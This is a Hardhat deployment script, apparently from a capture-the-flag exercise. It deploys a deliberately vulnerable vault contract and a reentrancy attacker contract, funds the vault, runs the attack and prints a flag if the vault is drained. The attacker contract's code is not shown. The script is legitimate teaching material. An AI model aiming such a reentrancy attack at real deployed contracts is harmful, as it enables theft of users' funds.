const { ethers } = require("hardhat");

async function main() {
  console.log("Deploying the vulnerable vault...");
  
  // Deploy the vulnerable vault
  const VaultFactory = await ethers.getContractFactory("ReentrancyVulnerableVault");
  const vault = await VaultFactory.deploy();
  await vault.waitForDeployment();
  
  const vaultAddress = await vault.getAddress();
  console.log("Vulnerable vault deployed at:", vaultAddress);
  
  // Deploy the attacker
  console.log("\nDeploying the attacker contract...");
  const AttackerFactory = await ethers.getContractFactory("ReentrancyAttacker");
  const attacker = await AttackerFactory.deploy(vaultAddress);
  await attacker.waitForDeployment();
  
  const attackerAddress = await attacker.getAddress();
  console.log("Attacker contract deployed at:", attackerAddress);
  
  // Fund the vault with some ETH so it can make the external calls
  const [deployer] = await ethers.getSigners();
  const fundTx = await deployer.sendTransaction({
    to: vaultAddress,
    value: ethers.parseEther("0.1")
  });
  await fundTx.wait();
  console.log("Vault funded with 0.1 ETH");
  
  // Execute the attack
  console.log("\n--- Executing attack ---");
  const attackTx = await attacker.attack();
  const receipt = await attackTx.wait();
  console.log("Attack transaction confirmed!");
  
  // Check if attack was successful
  const drained = await vault.vaultDrained();
  console.log("Vault drained:", drained);
  
  if (drained) {
    const flag = await attacker.getFlag();
    console.log("🚩 FLAG:", flag);
  } else {
    console.log("❌ Attack failed.");
    const counter = await vault.withdrawalCounter();
    console.log("Withdrawal counter:", counter.toString());
  }
}

main().catch(error => {
  console.error("Error:", error);
  process.exitCode = 1;
});